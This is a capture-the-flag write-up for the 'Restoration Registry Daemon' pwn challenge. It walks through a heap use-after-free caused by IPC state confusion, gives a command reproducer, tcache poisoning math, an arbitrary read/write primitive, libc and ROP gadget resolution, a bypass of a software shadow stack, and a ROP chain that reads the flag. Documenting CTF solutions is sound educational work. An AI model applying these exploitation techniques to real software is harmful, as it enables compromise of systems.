# Restoration Registry Daemon notes

## Challenge layout

Archive: `pwn_restoration-registry-daemon.zip`

Extracted tree:

```text
Dockerfile
src/
  directoryd
  entrypoint.sh
  registryd
  server.py
```

## Docker and service startup

`Dockerfile`:

- Base image: `ubuntu:25.10`.
- Installs `python3` only.
- Copies `src/` to `/opt/chal/`.
- `WORKDIR /opt/chal`.
- Makes `registryd`, `directoryd`, `server.py`, and `entrypoint.sh` executable.
- Exposes TCP port `5000`.
- Runs `/opt/chal/entrypoint.sh`.

`src/entrypoint.sh`:

```bash
ROOT="/opt/chal"
echo "BKISC{FLAG}" > "$ROOT/flag.txt"
exec python3 "$ROOT/server.py"
```

So the local/fake flag is `/opt/chal/flag.txt`.

`src/server.py`:

- Listens on `0.0.0.0:5000` by default (`RRD_HOST`/`RRD_PORT` can override).
- For every TCP client, creates a `socket.socketpair()`.
- Spawns `directoryd` with stdin/stdout/stderr redirected to `/dev/null`.
- Spawns `registryd` with stdin/stdout connected to the TCP proxy.
- Passes the socketpair FD to both children through `RRD_IPC_FD` and `pass_fds`.
- The TCP client never talks directly to `directoryd`; it talks to `registryd`, and `registryd` talks to `directoryd` over IPC.
- The wrapper is multi-process and threaded at the Python proxy level: one thread per TCP client session, with one `registryd` and one `directoryd` per session.

## Binary metadata

`file`:

```text
src/registryd:  ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped, BuildID db04abd8ed08793bea15e012d80924f4b62c245c
src/directoryd: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped, BuildID 2bf4d0cd9d444ab82f5c36b3cb0e19d6a3cd8870
```

Protections from `readelf`:

| Binary | PIE | NX | Canary | RELRO |
|---|---:|---:|---:|---:|
| `registryd` | yes, `DYN`, `FLAGS_1: PIE` | yes, `GNU_STACK RW` | yes, imports `__stack_chk_fail` | full, `GNU_RELRO` + `BIND_NOW` |
| `directoryd` | yes, `DYN`, `FLAGS_1: PIE` | yes, `GNU_STACK RW` | yes, imports `__stack_chk_fail` | full, `GNU_RELRO` + `BIND_NOW` |

`registryd` imported functions:

```text
__cxa_finalize, __errno_location, __isoc23_strtol, __isoc23_strtoull,
__libc_start_main, __stack_chk_fail, _exit, alarm, fgets, free,
fwrite, getenv, malloc, prctl, putc, puts, read, setvbuf,
strcasecmp, strlen, strncpy, write
```

`directoryd` imported functions:

```text
__cxa_finalize, __errno_location, __isoc23_strtol, __libc_start_main,
__stack_chk_fail, _exit, getenv, getrandom, prctl, read, strlen,
strncat, strncpy, write
```

Interesting strings:

```text
RRD_IPC_FD
rrd>
HELLO
OK
ERR
RESERVE
NOTE
STAGE
READY
SEAL
MIRROR
REPLAY
FETCH
DATA
ARCHIVE
RETIRE
QUIT
BYE
control protection fault
1DRR
 | replay
 | archived
```

## Seccomp / runtime policy

`registryd` installs a small seccomp filter with `prctl`. The relevant effect is:

- kills `execve`
- kills `execveat`
- kills `mprotect`
- kills `pkey_mprotect`
- kills `mmap` if `PROT_EXEC` is set

The exploit therefore does not try to spawn a shell or make memory executable. It uses existing libc `open`, `read`, and `write` to read `/opt/chal/flag.txt`.

## Client protocol

The client-facing parser in `registryd` is line-oriented:

- Reads command lines with `fgets(buf, 0x400, stdin)`.
- Trims trailing `\n`/`\r`.
- Splits tokens on spaces/tabs.
- `STAGE` is the exception: after the line `STAGE <slot> <length>`, the daemon prints `READY` and then reads exactly `<length>` raw bytes from stdin with `read(0, ...)`.

Commands:

```text
HELLO <name>
RESERVE <slot 0..23> <type 1..3> <name>
NOTE <slot> <note-rest>
STAGE <slot> <length>      # raw data follows after READY
SEAL <slot>
MIRROR <slot> <archive 0..7>
REPLAY <archive 0..7> <target slot 0..23>
FETCH <slot> <length>
ARCHIVE <slot>
RETIRE <slot>
QUIT
```

Type sizes from `directoryd` responses:

| Type | Allocated / fetchable size | Max `STAGE` write size |
|---:|---:|---:|
| 1 | `0x20` | `0x18` |
| 2 | `0x100` | `0xe8` |
| 3 | `0x430` | `0x338` |

`FETCH` checks the local record's stored size, not the `STAGE` cap. This matters for allocator metadata leaks.

## Registry/directory IPC

Both daemons exchange fixed-size `0x78`-byte frames over the inherited `RRD_IPC_FD` socketpair. Frame magic is `1DRR` (`0x52524431`).

Recovered frame fields:

```text
+0x00  u32 magic = 0x52524431
+0x04  u32 op
+0x08  u32 slot / index
+0x0c  u32 target slot / archive index depending on op
+0x10  u32 type
+0x14  u32 state
+0x18  u32 generation
+0x1c  u32 response status
+0x20  u64 size
+0x38  char name[~0x18]
+0x50  char note[~0x28]
```

`directoryd` keeps the authoritative logical state, while `registryd` keeps local heap pointers for data buffers.

Directory operations recovered:

```text
op 1  RESERVE
op 2  NOTE
op 3  SEAL
op 4  MIRROR
op 5  REPLAY
op 6  ARCHIVE
op 7  RETIRE
op 8/9 software shadow-stack / control-protection helpers
```

## Important local data structures

`registryd` local record table:

```text
PIE + 0x6360, 24 entries, entry size 0x58
+0x00 name[0x18]
+0x18 note[0x28]
+0x40 heap pointer
+0x48 size
+0x50 generation
+0x54 type
+0x55 state
```

`registryd` archive table:

```text
PIE + 0x60a0, 8 entries, entry size 0x58
+0x00 active
+0x01 type
+0x02 source slot
+0x04 generation
+0x08 heap pointer
+0x10 size
+0x18 name
+0x30 note
```

`directoryd` record table:

```text
PIE + 0x46a0, 24 entries, entry size 0x48
+0x00 name[0x18]
+0x18 note[0x28]
+0x40 generation
+0x44 type
+0x45 state
```

`directoryd` archive table:

```text
PIE + 0x4460, 8 entries, entry size 0x48
+0x00 active
+0x01 type
+0x02 source slot
+0x04 generation
+0x08 name
+0x20 note
```

## Bug class and vulnerable path

Bug class: IPC/state-confusion-created heap use-after-free with UAF read/write.

The bad sequence is:

1. `RESERVE` creates a local heap buffer in `registryd` and a logical record in `directoryd`.
2. `SEAL` makes the logical record mirrorable/replayable.
3. `MIRROR` creates a registry archive entry that aliases the original record's heap pointer. It does not copy the heap buffer and does not reference-count it.
4. `REPLAY` creates another registry record from the archive, again copying the same heap pointer.
5. `RETIRE` frees only the selected registry record's pointer and clears only that one local record.
6. Other aliased local records still keep the freed pointer.
7. `FETCH` on an alias reads freed memory; `STAGE` on an alias writes freed memory.

Minimal reproducer:

```text
HELLO x
RESERVE 0 2 A
RESERVE 2 2 B
SEAL 0
MIRROR 0 0
REPLAY 0 1
SEAL 2
MIRROR 2 1
REPLAY 1 3
RETIRE 0
RETIRE 2
FETCH 3 32
```

For two freed type-2 chunks, the first qword in the second freed chunk is glibc's safe-linked tcache `fd`. Because the two chunks are consecutive (`B = A + 0x110`), the script solves:

```text
encoded_fd = A ^ (B >> 12)
B = A + 0x110
```

Then it poisons the freed chunk's `fd` as:

```text
tcache_next = target ^ (B >> 12)
```

## Exploit primitive

The final exploit uses the UAF once to get a permanent arbitrary read/write primitive:

1. Leak the type-2 tcache safe-linked `fd` through the UAF alias.
2. Recover the heap address of the two freed chunks.
3. Infer `registryd` PIE base from the heap page:

```text
heap_page = leaked_chunk_A & ~0xfff
registryd_pie = heap_page - 0x7000
```

This is because the registry binary's last `LOAD` segment ends at `PIE + 0x6ba0`, rounded to the `brk` page at `PIE + 0x7000`.

4. Poison tcache so `malloc(0x100)` returns `registryd`'s local record table, specifically `record[23].ptr - 8`. The `-8` makes the target 16-byte aligned for glibc's tcache alignment check.
5. Reserve slot 5 so it points into `record[23]` metadata.
6. Use `STAGE 5` to rewrite `record[23]`:

```text
record[23].ptr  = arbitrary_address
record[23].size = large_size
record[23].type = 3
record[23].state = 1
```

7. Use `FETCH 23 <n>` for arbitrary read and `STAGE 23 <data>` for arbitrary write.

## libc and stack handling

No libc offsets are hardcoded in the final exploit.

The exploit:

1. Reads `registryd`'s `read@GOT` at `PIE + 0x5f98`.
2. Scans backward page-by-page from that pointer until it finds the in-memory libc ELF header.
3. Parses libc program headers and `PT_DYNAMIC` in memory.
4. Resolves dynamic symbols: `__libc_stack_end`, `open`, `read`, `write`, `exit`, `__libc_start_main`. `__libc_stack_end` is resolved through libc's relocation table when it is an undefined/imported symbol.
5. Searches libc's executable `LOAD` segment for simple ROP gadgets:
   - `ret`
   - `pop rdi; ret`
   - `pop rsi; ret`
   - `pop rdx; ret` or a small compatible variant
6. Reads `__libc_stack_end` to get a stack-range hint without reading environment strings or argv data.
7. Scans stack memory for the command-frame return slot used by the libc call in `FETCH`; in this binary it uses the same stack slot that `STAGE`'s raw `read(0, ...)` uses.

## Control-protection bypass

A first attempt to overwrite `main`'s saved return address worked as an arbitrary write but immediately caused:

```text
control protection fault
```

Reason: `registryd` and `directoryd` implement a software shadow-stack/control-protection protocol through IPC ops 8/9. Overwriting a protected return address is detected.

The working bypass overwrites the return address of the *live libc `read` call* used by `STAGE` to receive raw bytes:

1. Point record 23 at the stack slot that will hold `read@plt`'s return address during `STAGE`.
2. Send `STAGE 23 <payload_len>`.
3. Wait for `READY`.
4. Send the ROP chain as the raw stage bytes.
5. The kernel copies the ROP chain over the saved return address while `read` is executing.
6. When libc `read` returns, execution jumps directly to the ROP chain before `registryd`'s software shadow-stack check can run.

This is the final control-flow hijack.

## Final ROP chain

The ROP chain uses libc symbols resolved dynamically from memory:

```text
open("/opt/chal/flag.txt", O_RDONLY)
read(3, stack_buffer, 0x100)
write(1, stack_buffer, 0x100)
exit(...)
```

The fd is expected to be `3`: in the server's subprocess setup, fd 0/1/2 are pipes/stdout, the IPC socketpair fd is passed at a higher fd, and fd 3 is the first closed fd available for `open`.

## Things explicitly not used

The final exploit does not use:

- `/proc/id/map`
- procfs/sysfs/Docker metadata
- environment/cwd/argv/filesystem shortcut leaks
- hidden helper files
- prestaged payloads
- debugger-only addresses
- patched binaries
- image rebuilds

Debugger-only observations used during analysis but not in `solve.py`:

- The first direct overwrite attempt hit the in-binary software control-protection check and printed `control protection fault`.
- A temporary compatibility shim was used only because this analysis host could not run GLIBC_2.38+ binaries directly and had no Docker CLI. The shipped `solve.py` uses the real TCP protocol and does not rely on the shim.

## Final working command

```bash
python3 solve.py --host 127.0.0.1 --port 5000
```

Observed local TCP output from the final script:

```text
[+] tcache fd leak: enc=..., A=..., B=...
[+] heap base ~= ..., PIE base = ...
[+] read@GOT = ...
[+] libc base = ...
[+] resolved symbols: __libc_stack_end=..., exit=..., read=..., open=..., write=...
[+] gadgets: ret=..., pop_rdi=..., pop_rsi=..., pop_rdx=...
[+] __libc_stack_end -> ...
[+] selected live read-return stack slot ...
[+] arming record 23 to overwrite live read return ...
[+] flag: BKISC{FLAG}
```
